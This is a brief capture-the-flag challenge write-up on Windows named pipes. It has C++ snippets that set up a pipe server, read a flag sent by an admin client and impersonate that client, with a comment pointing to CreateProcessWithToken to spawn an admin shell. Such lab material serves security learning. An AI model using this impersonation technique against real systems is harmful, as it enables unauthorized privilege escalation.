HackMe: Named pipe

Karan Bamal Jan 22, 2022 2022-01-22T18:33:00+08:00
Jun 10 2026-06-10T20:35:09+08:00 1 min

Prerequisites
Hacking named pipes

Github: GitHub - abankalarm/ReHacks: This repo will house materials for ReHacks.live

Challenge

Given below is a simple client application that uses named pipes to communicate to the server, The client sends the flag in the pipe to the server.

MAIN OBJECTIVE:

Obtain the FLAG passed by the client to the server.

Extra mile:

Give the local user SeImpersonate privilege, and then perform local privilege escalation.

NOTE:

  • The client runs with Admin privileges.
  • The exploit code to be written by you, should only be launched as a user process.

EXPLANATION
Create and get the handle of the named pipe

HANDLE hNamedPipe = ::CreateNamedPipe(L"\\\\.\\pipe\\supersecurechannel",
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES,
		1000, 1000, 0, nullptr);

Wait for clients to show up

if (!::ConnectNamedPipe(hNamedPipe, nullptr) && ::GetLastError() != ERROR_PIPE_CONNECTED)
	ERROR("Failed in ConnectNamedPipe");

Read Data off the pipe

	WCHAR readDATA[500];
	DWORD ByteRead;
	ReadFile(hNamedPipe, &readDATA, sizeof(readDATA)-1, &ByteRead, NULL);
        printf("PIPE DATA %ls\n", readDATA);

Impersonation

	::ImpersonateNamedPipeClient(hNamedPipe)
	// Write the code you need to execute as admin here
	// createprocesswithtoken function will suffice in spawning a admin shell
	//
	// seImpersonate is needed
	::RevertToSelf();
